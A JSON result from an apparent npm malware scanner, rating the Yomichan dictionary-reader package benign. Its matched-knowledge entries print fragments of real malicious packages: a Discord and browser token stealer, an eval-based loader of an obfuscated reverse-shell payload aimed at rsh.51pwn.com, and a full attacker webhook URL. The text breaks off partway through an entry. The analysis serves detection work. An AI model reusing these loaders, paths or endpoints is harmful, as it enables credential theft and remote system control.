@@ -1,0 +1,516 @@
+{
+  "package_name": "yomichan-dict-reader",
+  "package_version": "1.2.2",
+  "label": "benign",
+  "detection_time": "2026-05-26T20:32:00.864244",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/yomichan.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/yomichan-dict-reader/1.2.2/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/yomichan-dict-reader/1.2.2/package/yomichan.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "yomichan_slice_1",
+          "code_snippet": "const fs = require('fs');\nconst jszip = require('jszip');\n\nconst termBankRegex = /term_bank_\\d+\\.json/;\nconst kanjiBankRegex = /kanji_bank_\\d+\\.json/;\n\nconst Yomichan = class {\n  allTermReadingPairsData = {};\n  allKeys = {};\n  allReadings = {};\n  allDicts = {};\n  kanjiData = {};\n  constructor(path = null) {\n    if (path) {\n      this.readDictionary(path);\n    }\n  }\n\n  /**\n   * Reads a zip file dictionary of the Yomichan format\n   * @param {string} dictname\n   */\n  async readDictionary(dictname) {\n    console.log('Reading dictionary: ', dictname);\n    const zipFile = await fs.promises.readFile(dictname);\n    const zip = await jszip.loadAsync(zipFile);\n\n    this.allDicts[dictname] = {};\n\n    let fileCount = 0;\n    let entryCount = 0;\n    for (const filename of Object.keys(zip.files)) {\n      if (termBankRegex.test(filename)) {\n        console.log(`Reading ${filename} from ${dictname}`);\n        const file = await zip.file(filename).async('string');\n        const json = JSON.parse(file);\n        for (const entry of json) {\n          const [term, reading, tags, deinflectors, popularity, definitions, sequence, bigTags] =\n            entry;\n\n          const thisEntry = {\n            term,\n            reading,\n            tags,\n            deinflectors,\n            popularity,\n            definitions,\n            sequence,\n            bigTags,\n            dict: dictname,\n          };\n\n          // add entry data\n          if (!this.allTermReadingPairsData[[term, reading]]) {\n            this.allTermReadingPairsData[[term, reading]] = [];\n          }\n          this.allTermReadingPairsData[[term, reading]].push(thisEntry);\n\n          // add to this dict\n          if (!this.allDicts[dictname][[term, reading]]) {\n            this.allDicts[dictname][[term, reading]] = [];\n          }\n          this.allDicts[dictname][[term, reading]].push(thisEntry);\n\n          // add readings lookup\n          if (!this.allKeys[term]) {\n            this.allKeys[term] = [];\n          }\n          if (!this.allKeys[term].includes(reading)) {\n            this.allKeys[term].push(reading);\n          }\n\n          // add term lookup from reading\n          if (!this.allReadings[reading]) {\n            this.allReadings[reading] = [];\n          }\n          if (!this.allReadings[reading].includes(term)) {\n            this.allReadings[reading].push(term);\n          }\n          entryCount++;\n        }\n        fileCount++;\n      }\n    }\n    console.log(`Read ${fileCount} files with ${entryCount} entries from ${dictname}`);\n  }\n\n  /**\n   * Reads multiple dictionaries\n   * @param {string[]} dictionaries\n   */\n  async readDictionaries(dictionaries) {\n    for (const dict of dictionaries) {\n      await this.readDictionary(dict);\n    }\n  }\n\n  /**\n   * Given a dictionary name, gets every single entry from that dictionary\n   * as an object containing every key/reading pair as a comma-separated string\n   * and the definitions as an array.\n   * @param {string} filename\n   */\n  async getAllEntriesFromDict(filename) {\n    if (!this.allDicts[filename]) {\n      await this.readDictionary(filename);\n    }\n    return this.allDicts[filename];\n  }\n\n  /**\n   * Given a dictionary name, gets every single term from that dictionary as a set.\n   * @param {string} filename\n   * @returns {Set.<string>}\n   */\n  async getAllTermsInDict(filename) {\n    const allTermreadingPairs = Object.keys(await this.getAllEntriesFromDict(filename));\n    return new Set(allTermreadingPairs.map((entry) => entry.split(',')[0]));\n  }\n\n  /**\n   * Checks if a dictionary contains a term.\n   * @param {string} filename filename of the dictionary to search\n   * @param {string} term the term to check for existence of\n   */\n  dictContains(filename, term) {\n    const readings = this.getReadingsForTerm(term);\n    for (const reading of readings) {\n      const definitions = this.getDefinitionsForTermReading(term, reading);\n      if (definitions.some((definition) => definition.dict == filename)) {\n        return true;\n      }\n    }\n    return false;\n  }\n\n  /**\n   * Gets readings of a kanji term.\n   * @param {string} term\n   */\n  getReadingsForTerm(term) {\n    return this.allKeys[term] ?? [];\n  }\n\n  /**\n   * Gets the terms for a reading\n   * @param {string} reading\n   */\n  getTermsForReading(reading) {\n    return this.allReadings[reading] ?? [];\n  }\n\n  /**\n   * Gets the definitions for a term reading pair.\n   * @param {string} term The term in kanji, or hiragana/katakana if no kanji exists for the term.\n   * @param {string} reading The reading in hiragana.\n   * @returns {Object[]} A list of definitions or an empty array.\n   */\n  getDefinitionsForTermReading(term, reading = '') {\n    // if term contains comma and reading is empty, separate into term reading\n    if (term.includes(',') && reading == '') {\n      [term, reading] = term.split(',');\n    }\n    // if term is same as reading, check definitions for empty reading too\n\n    let data = this.allTermReadingPairsData[[term, reading]];\n    data = data ?? this.allTermReadingPairsData[[term, '']];\n    return data ?? [];\n  }\n\n  /**\n   * Gets all the definitions for a single term.\n   * @param {string} term term to search\n   * @returns {Array.<Object>} A list of definitions or an empty array.\n   */\n  getDefinitionsForTerm(term) {\n    const readings = this.getReadingsForTerm(term);\n    let definitions = [];\n    for (const reading of readings) {\n      definitions.push(...this.getDefinitionsForTermReading(term, reading));\n    }\n    return definitions;\n  }\n\n  /**\n   * Gets all the deinflectors for a term and reading pair.\n   * @param {string} term\n   * @param {string} reading\n   * @returns {string} A space-separated list of deinflectors.\n   */\n  getDeinflectorsForTermReading(term, reading) {\n    const definitions = this.getDefinitionsForTermReading(term, reading);\n    if (definitions.length == 0) return '';\n    // combine deinflectors from all definitions\n    let deinflectors = [];\n    for (const definition of definitions) {\n      deinflectors.push(...definition.deinflectors.split(' '));\n    }\n    return [...new Set(deinflectors)].join(' ');\n  }\n\n  /**\n   *\n   * @returns {string[]} A list of all the dictionaries that have been read.\n   */\n  getCurrentDicts() {\n    return Object.keys(this.allDicts);\n  }\n\n  /**\n   * Reads a kanji dictionary\n   * @param {string} dictname\n   * @returns {Promise<void>}\n   */\n  async readKanjiDictionary(dictname) {\n    console.log('Reading kanji dictionary: ', dictname);\n    const zipFile = await fs.promises.readFile(dictname);\n    const zip = await jszip.loadAsync(zipFile);\n\n    this.kanjiData[dictname] = {};\n\n    let fileCount = 0;\n    let entryCount = 0;\n\n    for (const filename of Object.keys(zip.files)) {\n      if (kanjiBankRegex.test(filename)) {\n        console.log(`Reading ${filename} from ${dictname}`);\n        const file = await zip.file(filename).async('string');\n        const json = JSON.parse(file);\n        for (const entry of json) {\n          const [character, onyomi, kunyomi, tags, meaningsArr, statsObj] = entry;\n\n          const thisEntry = {\n            character,\n            onyomi,\n            kunyomi,\n            tags,\n            meaningsArr,\n            statsObj,\n            dict: dictname,\n          };\n\n          // add entry data\n          if (!this.kanjiData[dictname][character]) {\n            this.kanjiData[dictname][character] = [];\n          }\n          this.kanjiData[dictname][character].push(thisEntry);\n\n          entryCount++;\n        }\n        fileCount++;\n      }\n    }\n    console.log(`Read ${fileCount} files with ${entryCount} entries from ${dictname}`);\n  }\n\n  /**\n   * Gets the information for a kanji.\n   * @param {string} kanji\n   * @returns {Object} An object containing the information for the kanji.\n   */\n  getKanjiInfo(kanji, dictname) {\n    let data = this.kanjiData[dictname][kanji];\n    return data ?? [];\n  }\n};\n\nmodule.exports = Yomichan;\n",
+          "is_malicious": false,
+          "malice_score": 0.44292554457982386,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads local dictionary zip files using fs.promises.readFile and jszip to extract JSON dictionary data matching term_bank_\\d+.json and kanji_bank_\\d+.json patterns. It parses and stores dictionary entries in memory structures without performing any network, system execution, or cryptographic operations. This behavior involves file reading and JSON parsing only, with no suspicious hardcoded IPs, URLs, shell commands, or environment variables, thus posing no direct security risk.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a dictionary reader for Yomichan format zip files. It reads local zip files, extracts JSON data matching specific filename patterns, and stores the parsed data in memory. It does not perform any network communication, obfuscated code execution, environment manipulation, or access to sensitive system or user data. The known malicious patterns involve obfuscated code, access to browser or Discord local storage files, token extraction, network calls to external IP services, or execution of encoded payloads, none of which are present here. The use of fs.promises.readFile and jszip to read and parse local dictionary files is legitimate and expected behavior for this type of application. Therefore, there is no indication of malicious intent or behavior in this code.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250105_195714_456673_snippet_1",
+              "source_package": "fallguys (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456673/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44708454608917236,
+              "code_similarity": 0.34884634613990784,
+              "behavior_similarity": 0.5453227162361145,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const _0x13e5 = ['post', 'exec', 'https://cdn.discordapp.com/avatars/', '/AppData/Local/Google/Chrome/User\\x20Data/Default/Local\\x20Storage/leveldb', '/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb', '/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb', '/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb', '/AppData/Roaming/discord/Local Storage/leveldb', ...];",
+                "code_behavior": "At import-time, the code defines an obfuscated array containing hardcoded file paths to browser and Discord local storage databases, loads these strings into memory, and prepares them for subsequent automated access, enabling targeted data harvesting.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of obfuscated arrays to store file paths to browser and Discord storage locations is a strong indicator of credential and session theft malware, as it conceals the intent to access sensitive data.",
+                  "violated_expectations": "A legitimate package would not obfuscate or enumerate browser or Discord local storage file paths, nor would it require access to these locations without explicit user action and transparency.",
+                  "similar_legitimate_use": "Security auditing or backup tools may enumerate such files, but they do so transparently, with user consent, and without obfuscation.",
+                  "key_indicators": [
+                    "Obfuscated array of browser and Discord storage file paths",
+                    "Hardcoded references to leveldb directories for multiple browsers and Discord",
+                    "Preparation for automated file access at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "fallguys",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.6",
+                  "why_malicious": "The package 'fallguys' impersonates a legitimate API for the Fall Guys game but contains heavily obfuscated JavaScript code that, upon import, systematically locates, reads, and exfiltrates sensitive browser and Discord application data to a hardcoded Discord webhook. The package provides no legitimate functionality and is solely designed for credential and session theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated file paths and sensitive strings are loaded into memory at import-time.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Automated enumeration of sensitive files"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive browser and Discord storage files are read from disk using filesystem APIs.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Data harvesting and preparation for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvested data and user profile metadata are formatted into a JSON payload for webhook delivery.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Payload is sent to the attacker's Discord webhook endpoint via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Completion of data theft and attacker access to stolen credentials"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated arrays containing hardcoded browser and Discord storage file paths in JavaScript code",
+                    "Automated reading of browser and Discord local storage files at import-time without user interaction",
+                    "Network requests to Discord webhook endpoints with harvested sensitive data at import-time"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated arrays of file paths referencing leveldb directories",
+                    "Access to /AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb and similar paths by non-browser processes",
+                    "References to Discord and multiple Chromium-based browser storage locations in package code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to discordapp.com/api/webhooks/746189410042904617/RQVJEOhzAblK5FlkQ-WIXkWfKfg5BFCdsjTeVueAIrVLaQMTvHgbuhuqFafPZYHfwnEq",
+                    "Outbound connections to Discord webhook endpoints from npm package processes"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that, at import-time, access browser or Discord local storage files and send their contents to external webhooks, especially Discord API endpoints. Flag any code that contains obfuscated arrays of sensitive file paths or constructs network requests to hardcoded webhook URLs. Alert on npm packages that read browser or IM storage files without user interaction and initiate outbound network connections to Discord webhook domains. Correlate filesystem access to leveldb directories with network activity to Discord webhooks for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787618_snippet_2",
+              "source_package": "discord.dll (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4463290572166443,
+              "code_similarity": 0.37713202834129333,
+              "behavior_similarity": 0.5155260562896729,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation\nconst paths = [\n  '%LocalAppData%/Google/Chrome/User Data/Default',\n  '%LocalAppData%/BraveSoftware/Brave-Browser/User Data/Default',\n  '%LocalAppData%/Yandex/YandexBrowser/User Data/Default',\n  '%AppData%/Opera Software/Opera Stable',\n  '%AppData%/discordptb',\n  '%AppData%/discordcanary',\n  '%AppData%/discord'\n];\n// For each path, read LevelDB files and extract tokens\n// Collect PC username, Discord username, and public IP via https://api.ipify.org/?format=json",
+                "code_behavior": "At runtime, the code iterates through browser and Discord data directories, reads LevelDB files to extract Discord tokens and browser credentials, collects system and user information, and retrieves the public IP address, aggregating all data for exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing LevelDB files in browser and Discord directories to extract authentication tokens and user information is a direct indicator of credential theft and privacy violation.",
+                  "violated_expectations": "Normal packages do not access or parse LevelDB files in browser or Discord directories, nor do they aggregate user tokens, system information, or public IP addresses without explicit user consent.",
+                  "similar_legitimate_use": "Forensics or backup utilities may access such data with clear user authorization, but not in a package purporting to be a Discord utility.",
+                  "key_indicators": [
+                    "Direct access to browser and Discord LevelDB files",
+                    "Extraction of Discord tokens and user/system information",
+                    "Use of external IP lookup service (api.ipify.org)",
+                    "Aggregation of sensitive data for exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "app.js and classes/Grabber.js, Token.js, User.js, Util.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord.dll",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0",
+                  "why_malicious": "The package is explicitly designed to steal Discord user tokens and browser information by scanning local directories for credential storage, collecting system and user data, and exfiltrating this information to an attacker-controlled Discord webhook. It masquerades as a legitimate module, employs typosquatting, and ensures execution of its malicious payload both at install time and runtime, violating user trust and security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed during package installation via the postinstall script, launching the main app.js file.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initiates the main malicious logic responsible for data collection."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The main script scans browser and Discord directories, extracts tokens and user/system information, and collects the public IP address.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Aggregates the stolen data and prepares it for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is sent to an attacker-controlled Discord webhook via HTTPS POST.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and user information."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of arbitrary code during npm install via postinstall script that launches main application logic",
+                    "Access to LevelDB files in browser and Discord data directories for credential extraction",
+                    "Collection and aggregation of Discord tokens, browser credentials, system/user information, and public IP address",
+                    "Network requests to Discord webhooks containing sensitive user data"
+                  ],
+                  "file_indicators": [
+                    "Presence of a postinstall script in package.json that executes 'node .' or similar main entrypoint",
+                    "References in code to browser and Discord data directories (e.g., '%LocalAppData%/Google/Chrome/User Data/Default', '%AppData%/discord')",
+                    "Files named Grabber.js, Token.js, Webhook.js, or similar credential-grabbing modules"
+                  ],
+                  "network_indicators": [
+                    "Outgoing HTTPS POST requests to discord.com/api/webhooks/*",
+                    "Requests to https://api.ipify.org/?format=json for public IP retrieval"
+                  ],
+                  "how_to_detect": "Monitor npm packages for postinstall scripts that execute main application code. Flag any code that accesses LevelDB files in browser or Discord directories. Detect network requests to Discord webhooks, especially those containing tokens or user/system data. Look for package files or code referencing credential grabbing or browser data extraction. Correlate the presence of these behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4407668709754944,
+              "code_similarity": 0.4474669396877289,
+              "behavior_similarity": 0.4340667724609375,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456159_snippet_1",
+              "source_package": "colors-help (also colors_express, colors-helper) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456159/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43675482273101807,
+              "code_similarity": 0.3816920518875122,
+              "behavior_similarity": 0.49181756377220154,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var colors = {};\nmodule['exports'] = colors;\nvar o=0x516c;var _0x4e2b=['fs','path','os','readdirSync','statSync','readFileSync','toString','match','POST','https://replit.com/@evilKaue/discord-token-stealer','writeFileSync'];(function(_0x3e2b,_0x2e2b){...})(_0x4e2b,o); // Obfuscated code\n// Deobfuscated: Iterates over browser and Discord folders, searches for Discord tokens using regex, exfiltrates via HTTP POST.",
+                "code_behavior": "At import-time, the code recursively scans browser and Discord local storage folders for files, uses a regular expression to extract Discord authentication tokens, and sends any discovered tokens via HTTP POST to attacker-controlled domains, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is obfuscated and executes immediately upon import, accessing sensitive directories associated with browsers and Discord to extract authentication tokens. It then exfiltrates these tokens to external domains, which is a hallmark of info-stealer malware.",
+                  "violated_expectations": "A legitimate color formatting library should not access browser or Discord storage folders, nor should it perform network communication to external endpoints, especially not to exfiltrate sensitive data.",
+                  "similar_legitimate_use": "While some legitimate applications may access browser storage for backup or migration, a color utility library has no valid reason to interact with these folders or transmit data externally.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript in a core library file (colors.js)",
+                    "Access to browser and Discord storage folders such as /AppData/Roaming/discord*/Local Storage/leveldb",
+                    "Use of regular expressions to search for Discord token patterns",
+                    "HTTP POST requests to non-standard, attacker-controlled domains (e.g., replit.com/@evilKaue/discord-token-stealer, pegapiranha.com)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "colors.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "colors-help (also colors_express, colors-helper)",
+                  "package_manager": "npm",
+                  "package_versions": "1.4.0 (and other versions published in April/May 2022)",
+                  "why_malicious": "These packages are typosquats of the legitimate 'colors' library and contain heavily obfuscated JavaScript code that, upon installation or import, searches the user's filesystem for Discord authentication tokens and session data, then exfiltrates this sensitive information to attacker-controlled endpoints via HTTP POST requests. The packages also load remote code in Electron/Discord contexts to enable real-time credential theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious package, which immediately loads obfuscated code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token search and exfiltration"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code scans browser and Discord storage folders, searching for Discord authentication tokens using regular expressions.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted tokens are sent via HTTP POST requests to attacker-controlled endpoints, including Replit-hosted and custom domains.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives Discord tokens"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In Electron or Discord app contexts, additional remote code is loaded, which hooks into web requests to extract and exfiltrate tokens in real time.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Continuous credential theft and real-time exfiltration"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of obfuscated JavaScript in core library files (e.g., colors.js)",
+                    "Access to browser and Discord local storage folders (e.g., /AppData/Roaming/discord*/Local Storage/leveldb)",
+                    "Use of regular expressions to search for Discord token patterns in local files",
+                    "HTTP POST requests to non-standard, attacker-controlled domains (e.g., replit.com/@evilKaue/discord-token-stealer, pegapiranha.com, kauaudeou.space)",
+                    "Use of Electron APIs (electron, session.defaultSession.webRequest) in packages not intended for Electron apps",
+                    "Loading and execution of remote code from hardcoded URLs"
+                  ],
+                  "file_indicators": [
+                    "colors.js containing obfuscated code",
+                    "Unexpected access to /AppData/Roaming/discord*/Local Storage/leveldb",
+                    "Unexpected access to browser Local Storage/leveldb folders",
+                    "Presence of remote code loading logic referencing pegapiranha.com or similar domains"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to Replit-hosted endpoints (e.g., replit.com/@evilKaue/discord-token-stealer)",
+                    "HTTP POST requests to pegapiranha.com or kauaudeou.space domains",
+                    "Outbound requests to suspicious webhook endpoints (e.g., /api/webhooks/evilKaue)"
+                  ],
+                  "how_to_detect": "Monitor npm packages, especially those typosquatting popular libraries, for obfuscated JavaScript in core files. Flag any package that accesses browser or Discord storage folders, searches for Discord token patterns, or sends HTTP POST requests to non-standard or known malicious domains. Alert on use of Electron APIs in packages not intended for Electron apps, and on the presence of remote code loading from hardcoded URLs. Correlate file access to Discord/browser storage with outbound network activity to identified malicious endpoints for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456618_snippet_6",
+              "source_package": "jdb.js, db-json.js (npm)",
